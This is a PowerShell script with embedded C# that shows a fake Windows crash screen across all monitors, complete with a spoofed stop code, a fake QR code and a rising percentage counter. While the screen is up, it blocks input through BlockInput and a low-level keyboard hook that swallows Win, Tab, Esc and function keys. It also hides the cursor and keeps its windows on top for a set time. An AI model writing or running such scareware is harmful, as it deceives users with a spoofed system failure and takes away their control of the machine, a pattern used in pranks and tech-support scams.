$p = Get-Content "$PSScriptRoot\params_$($args[0]).json" | ConvertFrom-Json
$duration = $p.Time

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")] public static extern int ShowCursor(bool bShow);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);

    public delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelProc hookProc;

    public static void InstallHook() {
        hookProc = HookCallback;
        var mod = GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
        hookId = SetWindowsHookEx(13, hookProc, mod, 0);
    }

    public static void UninstallHook() {
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vk = Marshal.ReadInt32(lParam);
            // Win L, Win R, Tab, Alt+Tab, Ctrl+Esc, Esc, F4, F12, Win+D, Win+Tab
            if (vk == 0x5B || vk == 0x5C || vk == 0x09 || vk == 0x1B ||
                vk == 0x73 || vk == 0x74 || vk == 0x75 || vk == 0x76 ||
                vk == 0x77 || vk == 0x78 || vk == 0x79 || vk == 0x7A ||
                vk == 0x7B || vk == 0x20 || vk == 0x2E) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    public static void HideCursor() {
        for (int i = 0; i < 20; i++) ShowCursor(false);
    }

    public static void ShowCursorAgain() {
        for (int i = 0; i < 20; i++) ShowCursor(true);
    }
}
"@

[WinAPI]::InstallHook()
[WinAPI]::BlockInput($true)
[WinAPI]::HideCursor()

$screens = [System.Windows.Forms.Screen]::AllScreens
$forms = @()

function Draw-QR($size) {
    $bmp = New-Object System.Drawing.Bitmap($size, $size)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.Clear([System.Drawing.Color]::White)

    $cells = 29
    $cs = [int]($size / $cells)

    $pattern = @(
        "11111110100001010111111",
        "10000010011010010000001",
        "10111010110100010111101",
        "10111010001011010111101",
        "10111010110001010111101",
        "10000010101010010000001",
        "11111110101010111111110",
        "00000000010101000000000",
        "11011011111010111011011",
        "01010100010101010101010",
        "10110111001010110110111",
        "01010100101010101010100",
        "10110111010101110110111",
        "01010100101010101010100",
        "11111110101010111011011",
        "00000000010101000000000",
        "11111110101010111111110",
        "10000010101010010000001",
        "10111010110100010111101",
        "10111010001011010111101",
        "10111010110001010111101",
        "10000010101010010000001",
        "11111110100001010111111"
    )

    $black = [System.Drawing.SolidBrush]::new([System.Drawing.Color]::Black)

    for ($r = 0; $r -lt $cells; $r++) {
        for ($c = 0; $c -lt $cells; $c++) {
            $patRow = $r % $pattern.Count
            $patCol = $c % $pattern[0].Length
            if ($patRow -lt $pattern.Count -and $patCol -lt $pattern[$patRow].Length) {
                if ($pattern[$patRow][$patCol] -eq '1') {
                    $g.FillRectangle($black, $c * $cs, $r * $cs, $cs, $cs)
                }
            }
        }
    }

    $outerPen = New-Object System.Drawing.Pen([System.Drawing.Color]::Black, 3)
    $innerPen = New-Object System.Drawing.Pen([System.Drawing.Color]::Black, 2)

    foreach ($pos in @(@(0,0), @(0, $cells-7), @($cells-7, 0))) {
        $px = $pos[1] * $cs
        $py = $pos[0] * $cs
        $g.DrawRectangle($outerPen, $px, $py, $cs*7, $cs*7)
        $g.FillRectangle($black, ($px + $cs*2), ($py + $cs*2), $cs*3, $cs*3)
    }

    $g.Dispose()
    $black.Dispose()
    return $bmp
}

foreach ($screen in $screens) {
    $sw = $screen.Bounds.Width
    $sh = $screen.Bounds.Height

    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 212)
    $form.Bounds = $screen.Bounds
    $form.ShowInTaskbar = $false
    $form.KeyPreview = $true
    $form.Add_KeyDown({ $_.SuppressKeyPress = $true; $_.Handled = $true })

    $ml = [int]($sw * 0.10)
    $mt = [int]($sh * 0.13)

    $lFace = New-Object System.Windows.Forms.Label
    $lFace.Text = ":("
    $lFace.Font = New-Object System.Drawing.Font("Segoe UI Light", ([int]($sh * 0.15)), [System.Drawing.FontStyle]::Regular)
    $lFace.ForeColor = [System.Drawing.Color]::White
    $lFace.AutoSize = $true
    $lFace.Location = New-Object System.Drawing.Point($ml, $mt)
    $form.Controls.Add($lFace)

    $msgTop = $mt + [int]($sh * 0.27)
    $lMsg = New-Object System.Windows.Forms.Label
    $lMsg.Text = "Your PC ran into a problem and needs to restart. We're`njust collecting some error info, and then we'll restart for you."
    $lMsg.Font = New-Object System.Drawing.Font("Segoe UI", ([int]($sh * 0.026)), [System.Drawing.FontStyle]::Regular)
    $lMsg.ForeColor = [System.Drawing.Color]::White
    $lMsg.AutoSize = $true
    $lMsg.Location = New-Object System.Drawing.Point($ml, $msgTop)
    $form.Controls.Add($lMsg)

    $pctTop = $msgTop + [int]($sh * 0.15)
    $lPct = New-Object System.Windows.Forms.Label
    $lPct.Text = "0% complete"
    $lPct.Font = New-Object System.Drawing.Font("Segoe UI", ([int]($sh * 0.026)), [System.Drawing.FontStyle]::Regular)
    $lPct.ForeColor = [System.Drawing.Color]::White
    $lPct.AutoSize = $true
    $lPct.Location = New-Object System.Drawing.Point($ml, $pctTop)
    $form.Controls.Add($lPct)

    $qrTop = $pctTop + [int]($sh * 0.11)
    $qrSize = [int]($sh * 0.115)
    $qrBmp = Draw-QR $qrSize

    $qrBox = New-Object System.Windows.Forms.PictureBox
    $qrBox.Size = New-Object System.Drawing.Size($qrSize, $qrSize)
    $qrBox.Location = New-Object System.Drawing.Point($ml, $qrTop)
    $qrBox.Image = $qrBmp
    $qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
    $form.Controls.Add($qrBox)

    $infoX = $ml + $qrSize + [int]($sw * 0.018)
    $infoFs = [int]($sh * 0.014)
    $infoFont = New-Object System.Drawing.Font("Segoe UI", $infoFs, [System.Drawing.FontStyle]::Regular)

    $lI1 = New-Object System.Windows.Forms.Label
    $lI1.Text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode"
    $lI1.Font = $infoFont
    $lI1.ForeColor = [System.Drawing.Color]::White
    $lI1.AutoSize = $false
    $lI1.Width = [int]($sw * 0.38)
    $lI1.Height = [int]($sh * 0.07)
    $lI1.Location = New-Object System.Drawing.Point($infoX, $qrTop)
    $form.Controls.Add($lI1)

    $lI2 = New-Object System.Windows.Forms.Label
    $lI2.Text = "If you call a support person, give them this info:"
    $lI2.Font = $infoFont
    $lI2.ForeColor = [System.Drawing.Color]::White
    $lI2.AutoSize = $true
    $lI2.Location = New-Object System.Drawing.Point($infoX, ($qrTop + [int]($sh * 0.068)))
    $form.Controls.Add($lI2)

    $lI3 = New-Object System.Windows.Forms.Label
    $lI3.Text = "Stop code: CRITICAL_PROCESS_DIED"
    $lI3.Font = $infoFont
    $lI3.ForeColor = [System.Drawing.Color]::White
    $lI3.AutoSize = $true
    $lI3.Location = New-Object System.Drawing.Point($infoX, ($qrTop + [int]($sh * 0.098)))
    $form.Controls.Add($lI3)

    $forms += [PSCustomObject]@{ Form = $form; LabelPct = $lPct }
    $form.Show()
    $form.BringToFront()
    $form.Activate()
    $form.Focus()
}

$startTime = Get-Date
$endTime = $startTime.AddSeconds($duration)
$tickCount = 0

while ((Get-Date) -lt $endTime) {
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    $percent = [math]::Min([math]::Round(($elapsed / $duration) * 100), 100)

    foreach ($f in $forms) {
        $f.LabelPct.Text = "$percent% complete"
        $f.Form.TopMost = $true
        $f.Form.BringToFront()
        $f.Form.Activate()
        $f.Form.Refresh()
    }

    $tickCount++
    if ($tickCount % 5 -eq 0) {
        [WinAPI]::HideCursor()
    }

    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 200
}

[WinAPI]::BlockInput($false)
[WinAPI]::UninstallHook()
[WinAPI]::ShowCursorAgain()

foreach ($f in $forms) {
    $f.Form.Close()
    $f.Form.Dispose()
}